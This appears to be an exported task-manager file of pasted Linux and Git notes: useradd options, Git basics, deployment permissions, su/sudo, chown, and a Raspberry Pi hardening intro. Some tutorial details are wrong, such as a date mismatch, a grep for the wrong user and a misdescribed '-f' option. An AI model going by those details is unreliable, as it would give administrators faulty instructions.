To add/create a new user, all you’ve to follow the command ‘useradd‘ or ‘adduser‘ with ‘username’. The ‘username’ is a user login name, that is used by user to login into the system.

Only one user can be added and that username must be unique (different from other username already exists on the system).

For example, to add a new user called ‘tecmint‘, use the following command.

[root@tecmint ~]# useradd tecmint

When we add a new user in Linux with ‘useradd‘ command it gets created in locked state and to unlock that user account, we need to set a password for that account with ‘passwd‘ command.

[root@tecmint ~]# passwd tecmint
Changing password for user tecmint.
New UNIX password:
Retype new UNIX password:
passwd: all authentication tokens updated successfully.

Once a new user created, it’s entry automatically added to the ‘/etc/passwd‘ file. The file is used to store users information and the entry should be.

tecmint:x:504:504:tecmint:/home/tecmint:/bin/bash

The above entry contains a set of seven colon-separated fields, each field has it’s own meaning. Let’s see what are these fields:

    Username: User login name used to login into system. It should be between 1 to 32 charcters long.
    Password: User password (or x character) stored in /etc/shadow file in encrypted format.
    User ID (UID): Every user must have a User ID (UID) User Identification Number. By default UID 0 is reserved for root user and UID’s ranging from 1-99 are reserved for other predefined accounts. Further UID’s ranging from 100-999 are reserved for system accounts and groups.
    Group ID (GID): The primary Group ID (GID) Group Identification Number stored in /etc/group file.
    User Info: This field is optional and allow you to define extra information about the user. For example, user full name. This field is filled by ‘finger’ command.
    Home Directory: The absolute location of user’s home directory.
    Shell: The absolute location of a user’s shell i.e. /bin/bash.

2. Create a User with Different Home Directory

By default ‘useradd‘ command creates a user’s home directory under /home directory with username. Thus, for example, we’ve seen above the default home directory for the user ‘tecmint‘ is ‘/home/tecmint‘.

However, this action can be changed by using ‘-d‘ option along with the location of new home directory (i.e. /data/projects). For example, the following command will create a user ‘anusha‘ with a home directory ‘/data/projects‘.

[root@tecmint ~]# useradd -d /data/projects anusha

You can see the user home directory and other user related information like user id, group id, shell and comments.

[root@tecmint ~]# cat /etc/passwd | grep anusha

anusha:x:505:505::/data/projects:/bin/bash

3. Create a User with Specific User ID

In Linux, every user has its own UID (Unique Identification Number). By default, whenever we create a new user accounts in Linux, it assigns userid 500, 501, 502 and so on 

But, we can create user’s with custom userid with ‘-u‘ option. For example, the following command will create a user ‘navin‘ with custom userid ‘999‘.

[root@tecmint ~]# useradd -u 999 navin

Now, let’s verify that the user created with a defined userid (999) using following command.

[root@tecmint ~]# cat /etc/passwd | grep tecmint

navin:x:999:999::/home/navin:/bin/bash

NOTE: Make sure the value of a user ID must be unique from any other already created users on the system.
4. Create a User with Specific Group ID

Similarly, every user has its own GID (Group Identification Number). We can create users with specific group ID’s as well with -g option.

Here in this example, we will add a user ‘tarunika‘ with a specific UID and GID simultaneously with the help of ‘-u‘ and ‘-g‘ options.

[root@tecmint ~]# useradd -u 1000 -g 500 tarunika

Now, see the assigned user id and group id in ‘/etc/passwd‘ file.

[root@tecmint ~]# cat /etc/passwd | grep tarunika

5. Add a User to Multiple Groups

The ‘-G‘ option is used to add a user to additional groups. Each group name is separated by a comma, with no intervening spaces.

Here in this example, we are adding a user ‘tecmint‘ into multiple groups like admins, webadmin and developer.

[root@tecmint ~]# useradd -G admins,webadmin,developers tecmint

Next, verify that the multiple groups assigned to the user with id command.

[root@tecmint ~]# id tecmint

uid=1001(tecmint) gid=1001(tecmint)
groups=1001(tecmint),500(admins),501(webadmin),502(developers)
context=root:system_r:unconfined_t:SystemLow-SystemHigh

6. Add a User without Home Directory

In some situations, where we don’t want to assign a home directories for a user’s, due to some security reasons. In such situation, when a user logs into a system that has just restarted, its home directory will be root. When such user uses su command, its login directory will be the previous user home directory.

To create user’s without their home directories, ‘-M‘ is used. For example, the following command will create a user ‘shilpi‘ without a home directory.

[root@tecmint ~]# useradd -M shilpi

Now, let’s verify that the user is created without home directory, using ls command.

[root@tecmint ~]# ls -l /home/shilpi

ls: cannot access /home/shilpi: No such file or directory

7. Create a User with Account Expiry Date

By default, when we add user’s with ‘useradd‘ command user account never get expires i.e their expiry date is set to 0 (means never expired).

However, we can set the expiry date using ‘-e‘ option, that sets date in YYYY-MM-DD format. This is helpful for creating temporary accounts for a specific period of time.

Here in this example, we create a user ‘aparna‘ with account expiry date i.e. 27th April 2014 in YYYY-MM-DD format.

[root@tecmint ~]# useradd -e 2014-03-27 aparna

Next, verify the age of account and password with ‘chage‘ command for user ‘aparna‘ after setting account expiry date.

[root@tecmint ~]# chage -l aparna

Last password change						: Mar 28, 2014
Password expires						: never
Password inactive						: never
Account expires							: Mar 27, 2014
Minimum number of days between password change		        : 0
Maximum number of days between password change		        : 99999
Number of days of warning before password expires		: 7

8. Create a User with Password Expiry Date

The ‘-f‘ argument is used to define the number of days after a password expires. A value of 0 inactive the user account as soon as the password has expired. By default, the password expiry value set to -1 means never expire.

Here in this example, we will set a account password expiry date i.e. 45 days on a user ‘tecmint’ using ‘-e‘ and ‘-f‘ options.

[root@tecmint ~]# useradd -e 2014-04-27 -f 45 tecmint

9. Add a User with Custom Comments

The ‘-c‘ option allows you to add custom comments, such as user’s full name, phone number, etc to /etc/passwd file. The comment can be added as a single line without any spaces.

For example, the following command will add a user ‘mansi‘ and would insert that user’s full name, Manis Khurana, into the comment field.

[root@tecmint ~]# useradd -c "Manis Khurana" mansi

You can see your comments in ‘/etc/passwd‘ file in comments section.

[root@tecmint ~]# tail -1 /etc/passwd

mansi:x:1006:1008:Manis Khurana:/home/mansi:/bin/sh

10. Change User Login Shell:

Sometimes, we add users which has nothing to do with login shell or sometimes we require to assign different shells to our users. We can assign different login shells to a each user with ‘-s‘ option.

Here in this example, will add a user ‘tecmint‘ without login shell i.e. ‘/sbin/nologin‘ shell.

[root@tecmint ~]# useradd -s /sbin/nologin tecmint

You can check assigned shell to the user in ‘/etc/passwd‘ file.

[root@tecmint ~]# tail -1 /etc/passwd

tecmint:x:1002:1002::/home/tecmint:/sbin/nologin

Part II – 5 Advance Usage of useradd Commands
11. Add a User with Specific Home Directory, Default Shell and Custom Comment

The following command will create a user ‘ravi‘ with home directory ‘/var/www/tecmint‘, default shell /bin/bash and adds extra information about user.

[root@tecmint ~]# useradd -m -d /var/www/ravi -s /bin/bash -c "TecMint Owner" -U ravi

In the above command ‘-m -d‘ option creates a user with specified home directory and the ‘-s‘ option set the user’s default shell i.e. /bin/bash. The ‘-c‘ option adds the extra information about user and ‘-U‘ argument create/adds a group with the same name as the user.
12. Add a User with Home Directory, Custom Shell, Custom Comment and UID/GID

The command is very similar to above, but here we defining shell as ‘/bin/zsh‘ and custom UID and GID to a user ‘tarunika‘. Where ‘-u‘ defines new user’s UID (i.e. 1000) and whereas ‘-g‘ defines GID (i.e. 1000).

[root@tecmint ~]# useradd -m -d /var/www/tarunika -s /bin/zsh -c "TecMint Technical Writer" -u 1000 -g 1000 tarunika

13. Add a User with Home Directory, No Shell, Custom Comment and User ID

The following command is very much similar to above two commands, the only difference is here, that we disabling login shell to a user called ‘avishek‘ with custom User ID (i.e. 1019).

Here ‘-s‘ option adds the default shell /bin/bash, but in this case we set login to ‘/usr/sbin/nologin‘. That means user ‘avishek‘ will not able to login into the system.

[root@tecmint ~]# useradd -m -d /var/www/avishek -s /usr/sbin/nologin -c "TecMint Sr. Technical Writer" -u 1019 avishek

14. Add a User with Home Directory, Shell, Custom Skell/Comment and User ID

The only change in this command is, we used ‘-k‘ option to set custom skeleton directory i.e. /etc/custom.skell, not the default one /etc/skel. We also used ‘-s‘ option to define different shell i.e. /bin/tcsh to user ‘navin‘.

[root@tecmint ~]# useradd -m -d /var/www/navin -k /etc/custom.skell -s /bin/tcsh -c "No Active Member of TecMint" -u 1027 navin

15. Add a User without Home Directory, No Shell, No Group and Custom Comment

This following command is very different than the other commands explained above. Here we used ‘-M‘ option to create user without user’s home directory and ‘-N‘ argument is used that tells the system to only create username (without group). The ‘-r‘ arguments is for creating a system user.

[root@tecmint ~]# useradd -M -N -r -s /bin/false -c "Disabled TecMint Member" clayton

For more information and options about useradd, run ‘useradd‘ command on the terminal to see available options.</COMMENTS></TASK><TASK ID="154" TITLE="GITHUB" REFID="0" COMMENTSTYPE="849cf988-79fe-418a-a40d-01fe3afcab2c" CREATEDBY="RaptorPatrolCore" PRIORITY="10" RISK="0" PERCENTDONE="0" STARTDATE="42118.00000000" STARTDATESTRING="4/24/2015" CREATIONDATE="42118.88959491" CREATIONDATESTRING="4/24/2015 9:21 PM" LASTMOD="42419.63377315" LASTMODSTRING="2/19/2016 3:12 PM" TEXTCOLOR="0" TEXTWEBCOLOR="#000000" PRIORITYCOLOR="255" PRIORITYWEBCOLOR="#FF0000" SUBTASKDONE="0/19"><COMMENTS>	remove files

Remove directory from git and local

You could checkout 'master' with both directories;

git rm -r one-of-the-directories
git commit -m "Remove duplicated directory"
git push origin &lt;your-git-branch&gt; (typically 'master', but not always)

Remove directory from git but NOT local

As mentioned in the comments, what you usually want to do is remove this directory from git but not delete it entirely from the filesystem (local)

In that case use:

git rm -r --cached myFolder

You can add files using git add, example git add README, git add &lt;folder&gt;/*, or even git add *

Then use git commit -m "&lt;Message&gt;" to commit files

Finally git push -u origin master to push files.

When you make modifications run git status which gives you the list of files modified, add them using git add * for everything or you can specify each file individually, then git commit -m &lt;message&gt; and finally, git push -u origin master

Example - say you created a file README, running git status gives you

$ git status
# On branch master
# Untracked files:
#   (use "git add &lt;file&gt;..." to include in what will be committed)
#
#   README

Run git add README, the files are staged for committing. Then run git status again, it should give you - the files have been added and ready for committing.

$ git status
# On branch master
# Changes to be committed:
#   (use "git reset HEAD &lt;file&gt;..." to unstage)
#
#   new file:   README
#

nothing added to commit but untracked files present (use "git add" to track)

Then run git commit -m 'Added README'

$ git commit -m 'Added README'

We’ve tacked the word origin onto it to indicate a new place from which files will originate. remote is a descriptor of origin, to indicate the origin is not on the computer, but somewhere online.</COMMENTS><TASK ID="330" TITLE="check origin" REFID="0" COMMENTSTYPE="PLAIN_TEXT" CREATEDBY="RaptorPatrolCore" PRIORITY="5" RISK="0" PERCENTDONE="0" STARTDATE="42510.00000000" STARTDATESTRING="5/20/2016" CREATIONDATE="42510.70967593" CREATIONDATESTRING="5/20/2016 5:01 PM" LASTMOD="42510.70996528" LASTMODSTRING="5/20/2016 5:02 PM" TEXTCOLOR="0" TEXTWEBCOLOR="#000000" PRIORITYCOLOR="15732480" PRIORITYWEBCOLOR="#000FF0"><COMMENTS>http://stackoverflow.com/questions/4089430/how-can-i-determine-the-url-that-a-local-git-repository-was-originally-cloned-fr


If referential integrity has been broken:

git config --get remote.origin.url

If referential integrity is intact:

git remote show origin

When using git clone (from GitHub, or any source repository for that matter) the default name for the source of the clone is "origin". Using git remote show will display the information about this remote name. The first few lines should show:

C:\Users\jaredpar\VsVim&gt; git remote show origin

Starting git 1.8.5 (Q4 2013), you will be able to "use a Git command, but without having to change directories".

    Just like "make -C &lt;directory&gt;", "git -C &lt;directory&gt; ..." tells Git to go there before doing anything else.

See commit 44e1e4 by Nazri Ramliy:

    It takes more keypresses to invoke Git command in a different directory without leaving the current directory:

        (cd ~/foo &amp;&amp; git status)

          git --git-dir=~/foo/.git --work-tree=~/foo status

          GIT_DIR=~/foo/.git GIT_WORK_TREE=~/foo git status
        (cd ../..; git grep foo)
        for d in d1 d2 d3; do (cd $d &amp;&amp; git svn rebase); done

    The methods shown above are acceptable for scripting but are too cumbersome for quick command line invocations.

    With this new option, the above can be done with fewer keystrokes:

        git -C ~/foo status
        git -C ../.. grep foo
        for d in d1 d2 d3; do git -C $d svn rebase; done

Since Git 2.3.4 (March 2015), and commit 6a536e2 by Karthik Nayak (KarthikNayak), git will treat "git -C '&lt;path&gt;'" as a no-op when &lt;path&gt; is empty.

    'git -C ""' unhelpfully dies with error "Cannot change to ''", whereas the shell treats cd ""' as a no-op.
    Taking the shell's behavior as a precedent, teach git to treat -C ""' as a no-op, as well.

Managing file and folder permissions when deploying with Git
13 Replies
Preface

I use Git as a version control and deployment system. When a website gets pushed to a server, all files get pulled into the web root (i.e. htdocs) by a user named git executing git pull in the post-receive hook.

By default, all files and folders git creates have 664 and 775 permissions, respectively, and are owned by that user. 664 translates to the user and group being able to read and write, and everyone else only being able to read, and 775 translates to the user and group being able to read, write and execute, and everyone else only being able to read and execute. (That’s a mouthful!)

1
2

	

-rw-rw-r-- 1 git  git   30 Aug  15  23:04 test-file.txt
drwxrwxr-x 1 git  git  102 Aug  15  23:04 test-directory

Now, in an instance where you need a folder in htdocs writable by another user, like apache, for let’s say a caching system, you need to be able to set those particular permissions accordingly.

To accomplish this, you really only have two options:

    Set permissions of files to 666 and folders to 777
    Set the owner or group to apache (or a group that apache is a member of)

Personally, I favor restrictive permissions over convenience, so option #1 is out, which means we’re going to take a look at how to implement option #2.

Goals

    Keep website files and folders owned by git, which essentially makes them read-only to apache and the public
    Allow apache to create and modify files and folders only in specified folders
    Maintain a streamlined deployment, meaning all permission modifications need to happen in the post-receive hook using only the permissions the git user already has

Note: I’m running CentOS/RedHat, meaning that some commands may differ if you’re using a different operating system.
1. Set group ID (setgid bit)

The first thing we need to do is ensure that everything inside htdocs remains owned by git, in other words, ensure only git can create and modify files and folders. This leaves us with having to change the group of the folders that apache needs to write to, but the problem is that git doesn’t have the proper permissions to use the chgrp command.

What we’ll do instead is create a new group called web, add git and apache as members of that group, and then enforce that all files and folders created in htdocs are automatically placed in the web group.

Let’s elevate our permissions to root and create a new group:

1
2

	

[ryan@vps ~]$ sudo su -
[root@vps ~]$ groupadd web

Next we’ll add both git and apache to that group:

1
2

	

[root@vps ~]$ usermod -a -G web git
[root@vps ~]$ usermod -a -G web apache

Lastly we’ll set the setgid bit on the htdocs folder:

1
2
3
4
5
6
7

	

[root@vps ~]$ ll /var/www/domains/domain.com/www
drwxrwxr-x 5 git  git  4096  Aug 15 23:56  htdocs
[root@vps ~]$ chgrp web /var/www/domains/domain.com/www/htdocs
[root@vps ~]$ chmod g-w /var/www/domains/domain.com/www/htdocs
[root@vps ~]$ chmod g+s /var/www/domains/domain.com/www/htdocs
[root@vps ~]$ ll /var/www/domains/domain.com/www
drwxr-sr-x 5 git  web  4096  Aug 15 23:56 htdocs

    Print out current permissions for htdocs
    Set the group of htdocs to web
    Remove write permissions for the group on htdocs
    Set the setgid bit on htdocs
    Print out new permissions (note the ‘s’ flag in the group)

Going forward, any file or folder that’s created in htdocs will automatically set web as the group. If you already have files and folders in htdocs, you can recursively put them in the web group, but be conscious about the effect this will have on everything you have in that folder.

1

	

chgrp -R web /var/www/domains/domain.com/www/htdocs

At first it my seem tempting to simply set the group to apache, however when git later modifies a folder to allow apache to create files and folders inside, the setgid bit is unset. The reason for this is that git does not belong to the apache group. To circumvent this particular issue, we created the new web group that both users could be a member of, which allows git to effectively give apache write permissions without unsetting the setgid bit.
2. Set umask to 022

By doing the above, we’ve violated one of our goals, and that’s the fact that apache will now have write permissions on all files and folders after git pull is run for the first time.

I don’t know if you’ve ever noticed, but when you create a new file or folder using root, the permissions are actually set to 644 and 755, respectively. Those default permissions are set via a command called umask, and we’ll now emulate this behavior for the git user.

As a side note, if you want to learn more about umask, there is a great article about what umask is and how it works.

There is a file called profile which sets a default umask value for all system users:

1
2
3
4
5
6
7
8
9
10
11
12

	

[root@vps ~]# cat /etc/profile
...
# By default, we want umask to get set. This sets it for login shell
# Current threshold for system reserved uid/gids is 200
# You could check uidgid reservation validity in
# /usr/share/doc/setup-*/uidgid file
if [ $UID -gt 199 ] &amp;&amp; [ "`id -gn`" = "`id -un`" ]; then
    umask 002
else
    umask 022
fi
...

You’ll notice that by default, all users with a user ID of 200 or greater will receive a umask of 002, and all users with ID 199 or less, a umask of 022. Looking at the chart below, you can look up what this translates to:

    0: read, write and execute
    1: read and write
    2: read and execute
    3: read only
    4: write and execute
    5: write only
    6: execute only
    7: no permissions

002 means rwx for owner, rwx for group, and r-x for everyone else. (The default for new system users).

022 means rwx for owner, r-x for group, and r-x everyone else. (The default for built-in system users).

We’ll use the git user’s .bashrc file to automatically set the umask to 022. The .bashrc file is executed every time a user logs in or opens a new terminal window. Here is a brief explanation from linux.die.net:

    Today, it is more common to use a non-login shell, for instance when logged in graphically using X terminal windows. Upon opening such a window, the user does not have to provide a user name or password; no authentication is done. Bash searches for ~/.bashrc when this happens, so it is referred to in the files read upon login as well, which means you don’t have to enter the same settings in multiple files.

Let’s edit the file now:

1
2
3
4
5

	

[root@vps ~] su git
[git@vps ~]$ vi ~/.bashrc
...
# User specific aliases and functions
umask 022

    Switch over to the git user
    Edit the .bashrc file in the home directory
    Add umask 022 to the bottom

3. Use post-receive hook to update permissions

The last step, and this will be specific to your needs, we’ll use the post-receive hook to set permissions to allow apache to write to specified folders. I’ve pulled out and modified the relevant commands from my post-receive hook to provide an example:

1
2

# Set path to htdocs
htdocs="/var/www/domains/domain.com/www/htdocs"
 
# Unset global GIT_DIR so script can leave repository
unset GIT_DIR
 
# Move into htdocs
cd $htdocs
 
# If cache directory does not exist
if [ ! -d "$htdocs/cache" ]; then
 
  # Create cache directory for cache files
  mkdir $htdocs/cache
 
  # Allow Apache to write to cache
  chmod g+w $htdocs/cache
 
fi

That’s pretty much it, and it meets all of our goals. If you have any questions or comments, leave them below.

My initial commit contained some log files. I've added *log to my .gitignore, and now I want to remove the log files from my repository.

git rm mylogfile.log

will remove a file from the repository, but will also remove it from the local file system.

How can I remove this file from the repo without deleting my local copy of the file?

ANSWER:

git rm --cached mylogfile.log

For a directory:

git rm --cached -r mydirectory

If referential integrity has been broken:

git config --get remote.origin.url

If referential integrity is intact:

git remote show origin

When using git clone (from GitHub, or any source repository for that matter) the default name for the source of the clone is "origin". Using git remote show will display the information about this remote name. The first few lines should show:

C:\Users\jaredpar\VsVim&gt; git remote show origin

    See also GitHub For Beginners: Don't Get Scared, Get Started

Now that these steps have been accomplished, let's add the first part of your project now by making your first commit to GitHub. When we last left off, we'd created a local repository called MyProject, which, when viewed in the command line, looks like this screenshot.
Local repo as viewed from Terminal.
Local repo as viewed from Terminal.

On your next line, type:

touch Readme.txt

This, again, is not a Git command. It’s another standard navigational command prompt. touch really means “create.” Whatever you write after that is the name of the thing created. If you go to your folder using Finder or the Start menu, you’ll see an empty Readme.txt file is now inside. You could have also made something like “Readme.doc” or “Kiwi.gif,” just for kicks.

You can clearly see your new Readme file. But can Git? Let’s find out. Type:

git status

The command line, usually so passive up to this point, will reply with a few lines of text similar to this:

# On branch master

# Untracked files:

#   (use "git add ..." to include in what will be committed)

#

#         Readme.txt

What’s going on? First of all, you’re on the master branch of your project, which makes sense since we haven’t “branched off” of it. There’s no reason to, since we’re working alone. Secondly, Readme.txt is listed as an “untracked” file, which means Git is ignoring it for now. To make Git notice that the file is there, type:

git add Readme.txt

Notice how the command line gave you a hint there? All right, we’ve added our first file, so it’s time to take a “snapshot” of the project so far, or “commit” it:

git commit -m “Add Readme.txt”

The highlighted text is our first commit.
The highlighted text is our first commit.

The -m flag, as noted in the terms directory in Part 1, simply indicates that the following text should be read as a message. Notice the commit message is written in present tense. You should always write your commands in present tense because version control is all about flexibility through time. You’re not writing about what a commit did, because you may always revert to earlier. You’re writing about what a commit does.

Now that we’ve done a little work locally, it’s time to “push” our first commit up to GitHub.

“Wait, we never connected my online repository to my local repository,” you might be thinking. And you’re right. In fact, your local repository and your online one are only connecting for short bursts, when you’re confirming project additions and changes. Let’s move on to making your first real connection now.
Connect Your Local Repository To Your GitHub Repository

Having a local repository as well as a remote (online) repository is the best of both worlds. You can tinker all you like without even being connected to the Internet, and at the same time showcase your finished work on GitHub for all to see.

This setup also makes it easy to have multiple collaborators working on the same project. Each of you can work alone on your own computers, but upload or “push” your changes up to the GitHub repository when they’re ready. So let’s get cracking.

First, we need to tell Git that a remote repository actually exists somewhere online. We do this by adding it to Git’s knowledge. Just like Git didn’t acknowledge our files until we used the git add command, it won’t acknowledge our remote repo yet, either.

Assume that we have a GitHub repo called “MyProject” located at https://github.com/username/myproject.git. Of course, username should be replaced with whatever your GitHub username actually is, and myproject should be replaced with the actual title you named your first GitHub repository.

git remote add origin https://github.com/username/myproject.git

The first part is familiar; we’ve used git add already with files. We’ve tacked the word origin onto it to indicate a new place from which files will originate. remote is a descriptor of origin, to indicate the origin is not on the computer, but somewhere online.

Git now knows there’s a remote repository and it’s where you want your local repository changes to go. To confirm, type this to check:

git remote -v

This command gives you a list of all the remote origins your local repository knows about. Assuming you’ve been with me so far, there should only be one, the myproject.git one we just added. It's listed twice, which means it is available to push information to, and to fetch information from. 

Now we want to upload, or “push,” our changes up to the GitHub remote repo. That’s easy. Just type:

git push

The command line will chug through several lines on its own, and the final word it spits out will most likely be “everything up-to-date.”

Git's giving me a bunch of warnings here since I just did the simple command. If I wanted to be more specific, I could have typed git push origin master, to specify that I meant the master branch of my repository. I didn't do that because I only have one branch right now.

Log into GitHub again. You’ll notice that GitHub is now tracking how many commits you’ve made today. If you’ve just been following this tutorial, that should be exactly one. Click on your repository, and it will have an identical Readme.txt file as we earlier built into your local repository.
All Together Now!

Congratulations, you are officially a Git user! You can create repos and commit changes with the best of them. This is where most beginner tutorials stop.

However, you may have this nagging feeling that you still don’t feel like an expert. Sure you managed to follow through a few steps, but are you ready to be out on your own? I certainly didn’t.

In order to get more comfortable with Git, let’s walk through a fictional workflow while using a little of everything we’ve already learned. You are now a worker at 123 Web Design, where you’re building a new website for Jimmy’s Ice Cream Shop along with a few of your coworkers.

You were a little nervous when your boss told you that you’d be participating in the Jimmy’s Ice Cream Shop webpage redesign project. After all, you’re not a programmer; you’re a graphic designer. But your boss assured you that anyone can use Git.

You’ve created a new illustrations of an ice cream sundae, and it’s time to add it to the project. You’ve saved them in a folder on your computer that is also called “icecream” to prevent yourself from getting confused.

Open up the Command Line and change directory until you’re inside the icecream folder, where your designs are stored.

cd ~/icecream

Next, initialize Git so you can start using Git commands inside the folder. The folder is now a Git repository.

git init

Wait, this is the right folder, right? Here’s how you check and make sure this is where you stored your design:

git status

And this is what Git will tell you in reply:

# Untracked files:
#   (use "git add ..." to include in what will be committed)

#

#       chocolate.jpeg

There they are! Add them to your local Git repository so they’ll be tracked by Git.

git add chocolate.jpeg

Now, take a “snapshot” of the repository as it stands now with the commit command:

git commit -m “Add chocolate.jpeg.”

Great! But your co-workers, hard at work in their own local repositories, can’t see your fantastic new design. That’s because the main project is stored in the company GitHub account (username: 123WebDesign) in the repository called “icecream.”

Since you haven’t connected to the GitHub repo yet, your computer doesn’t even know this exists. So tell your local repository about it:

git remote add origin https://github.com/123WebDesign/icecream.git

And double check to make sure it knows:

git remote -v

Finally, it’s the moment you’ve been waiting for. Upload that delicious looking sundae up to the project:

git push

Ta da! With all of these tool at hand, it's clear that Git and the GitHub service aren't just for programmers.</COMMENTS></TASK><TASK ID="160" TITLE="http://stackoverflow.com/questions/11855517/git-rm-file-name-with-space" REFID="0" COMMENTSTYPE="PLAIN_TEXT" CREATEDBY="RaptorPatrolCore" PRIORITY="5" RISK="0" PERCENTDONE="0" STARTDATE="42332.00000000" STARTDATESTRING="11/24/2015" CREATIONDATE="42332.69797454" CREATIONDATESTRING="11/24/2015 4:45 PM" LASTMOD="42332.69804398" LASTMODSTRING="11/24/2015 4:45 PM" TEXTCOLOR="0" TEXTWEBCOLOR="#000000" PRIORITYCOLOR="15732480" PRIORITYWEBCOLOR="#000FF0"><COMMENTS>The same way you'd use rm to remove such a file: quote the name:

R Perrin has it right.

But it is a far better thing to login to a system via ssh as a "normal user", and become root should the need arise. One of the recommended hardening activities for a *NIX box is to disallow remote root login.

As root, you may issue

su - username

You will not be prompted for a password.

At the command prompt, type:

su -l &lt;normal user&gt;

su is the linux command to Switch User. The -l command line option will open the new terminal session with the user's environment variables.

It's su - &lt;username&gt;. However you really want to deny root access via ssh! Refer to /etc/ssh/sshd.conf and the setting PermitRootLogin no.

A secure way is:

$ sudo su - [userid]

Under normal circumstances you might not give just any use sudoer access. Also you don't want to give root remote ssh access. So you would log in under your own userID (or an ID with sudoer access) then execute the command similar to the first answer, but using "sudo".

As mentioned in some of the other commands the "-" will give you the users environment. You will inadvertently be running as that user.

If you're using sudo, su doesn't need to be involved. sudo -su &lt;userid&gt; for a normal shell, sudo -iu &lt;userid&gt; for a login shell. – muru Jun 21 '15 at 14:28
   	 
	
@muru You're right. I didn't want to give a catch 22 and say you can't. I took the question into consideration and gave a safe route to take... Don't log in as root. Look in as a user who has sudo privileges then sudo su - [userid] into that user. – L. D. James Jun 21 '15 at 16:09

penguintutor.com/linux/useradmin-reference

Excerpt:

    su (Switch User)

    One of the features of Linux is the ability to change userid when logged into a system. This command su is sometimes referred to as superuser , however this is not completely correct. In the early days of UNIX it was only possible to change to the root user, which made for the superuser command however it is now possible to change to any user using the su command. It is more correct to refer to the command as the switch user command.

    The switch user command su is used to change between different users on a system, without having to logout. The most common use is to to change to the root user, but it can be used to switch to any user depending upon the users settings. To switch to a different user other than root, then the username is used as the last option on the command.

    It is also possible to change to another user by putting the username after the su command. There are two ways of switching users. By putting a '-' after the command will cause the users profile to be read and variables to be set. Without the '-' the previous users settings will still remain.

    To use the new users profile and variables

    su - username

    To continue with the current profile and variables

    su username

    you can then return to the previous user by entering exit.

-Always Take the issue of safety first, so the same would be correct to disconnect and return the system to the correct user, the 'su' command will not le give the desired security for the system because you still remain as' Root 'and even security must want to leave this user and return to the correct user. – Paulo Maia Jun 21 '15 at 4:07
   	 
	
@PauloMaia I don't understand what you mean? Did you read the question? I just want to change from root to normal-user on a system which I have and active terminal session running. This question got alot of down-votes so I found out how to do it and this answers my question. It's simple su lets me change users and your not the first to mention security which I still don't understand the relevance to this. – somethingSomething Jun 21 '15 at 4:12
   	 
	
yes! you change from root to another user but to the system you continues like root and this is not secure because the security need be first, with this you think change 'or think changed of the usr but not changed!'. – Paulo Maia Jun 21 '15 at 4:23 </COMMENTS><TASK ID="253" TITLE="switch users" REFID="0" COMMENTSTYPE="PLAIN_TEXT" CREATEDBY="RaptorPatrolCore" PRIORITY="5" RISK="0" PERCENTDONE="0" STARTDATE="42415.00000000" STARTDATESTRING="2/15/2016" CREATIONDATE="42415.83774306" CREATIONDATESTRING="2/15/2016 8:06 PM" LASTMOD="42415.83788194" LASTMODSTRING="2/15/2016 8:06 PM" TEXTCOLOR="0" TEXTWEBCOLOR="#000000" PRIORITYCOLOR="15732480" PRIORITYWEBCOLOR="#000FF0"><COMMENTS>-su &lt;username&gt;</COMMENTS></TASK></TASK><TASK ID="252" TITLE="move files " REFID="0" COMMENTSTYPE="PLAIN_TEXT" CREATEDBY="RaptorPatrolCore" PRIORITY="5" RISK="0" PERCENTDONE="0" STARTDATE="42415.00000000" STARTDATESTRING="2/15/2016" CREATIONDATE="42415.83594907" CREATIONDATESTRING="2/15/2016 8:03 PM" LASTMOD="42415.83601852" LASTMODSTRING="2/15/2016 8:03 PM" TEXTCOLOR="0" TEXTWEBCOLOR="#000000" PRIORITYCOLOR="15732480" PRIORITYWEBCOLOR="#000FF0"><COMMENTS>http://www.rapidtables.com/code/linux/linux-move-file.htm

How to move up a directory 
cd ../

cd .. will back the directory up by one. If you want to reach a folder in the parent directory, you can do something like cd ../foldername. You can use the ".." trick as many times as you want to back up through multiple parent directories. For example, cd ../../Applications would take you to Macintosh HD/Applications

cd ../../../../../../../

Also another useful navigation tip is if for example lets say you keep switching from a direcotry (call it A) to another (call it B) that's 7 directories up as in your case.

So if you in directory A:

A&gt; cd ../../../../../../../
B&gt; //now your in directory B and wanna go back to A
B&gt; cd -

That will move right back to directory A. - expands to the previous directory you were in.

Move folder content up one level
mv myfolder/* .

Use chown to change ownership and chmod to change rights.

As Paweł Karpiński said, use the -R option to apply the rights for all files inside of a directory too.

Note that both these commands just work for directories too. The -R option makes them also change the permissions for all files and directories inside of the directory.

For example

sudo chown -R username:group directory

will change ownership (both user and group) of all files and directories inside of directory and directory itself.

sudo chown username:group directory

will only change the permission of the folder directory but will leave the files and folders inside the directory alone.

As enzotib mentioned, you need to use sudo to change the ownership from root to yourself.

Edit:

Note that if you use chown &lt;user&gt;: &lt;file&gt; (Note the left-out group), it will use the default group for that user.

If you want to change only the group, you can use:

chown :&lt;group&gt; &lt;file&gt;

Defanging the pi user account on raspbian

Raspbian ships with remote ssh access enabled for an account with a well known password that can gain access to root-level commands. Let's fix that.
29 July 2015 on Raspberry Pi

The Raspberry Pi (RPi) puts a low-cost, dedicated linux computer within reach of a huge audience of curious and enthusiastic users. This is a good thing, but it means an inexperienced audience is quickly learning hard lessons whenever they expose their new toy to the Internet.

    tl;dr: The default raspbian configuration ships with remote ssh access enabled for an account with a well known password that can gain access to root-level commands.

Here are some tips for tightening up user access on a Raspberry Pi (RPi) running raspbian.

Important: This is not a comprehensive guide to linux security. The focus here is on reducing the threats associated with the default pi user configuration on raspbian.
Who's responsible?

You are. The Raspberry Pi was developed for educational settings. It has amazing capabilities, and hobbyists and hackers were quick to embrace it and push it well beyond its original purpose. When you connect one to the Internet, you’re taking it way outside of its intended environment. The onus for protecting your RPi is on you, regardless of the distribution you run. If you’re not prudent, you risk much more than just your $35 RPi. You place your entire network at risk, and provide a springboard for attacks on your neighbors and the Internet at large. If you’re thinking about putting your RPi on the Internet, be sure you've taken some basic precautions first.
What's wrong with the defaults?

The Raspberry Pi Foundation made several choices for raspbian that make the RPi particularly vulnerable in a default configuration:

    The default pi user is configured with the well-known raspberry default password. If you make your RPi accessible without changing this default, you’ve essentially left the front door to your system open.
    The pi account is allowed to run programs with root permissions without using the password using sudo. This means that anybody who can get access using the pi user account has instant access to the entire system without so much as entering a password.
    Raspbian ships with ssh enabled for remote access.

The wisdom of these choices has argued at length elsewhere, and I’m not going to re-hash the debate here. In the spirit of fixing problems, not blame, let's focus on securing your raspbian install.

IMPORTANT: Keep in mind

    These measures only protect the RPi itself.
    You still need to run a properly-configured firewall and other measures to protect anything else on your network.
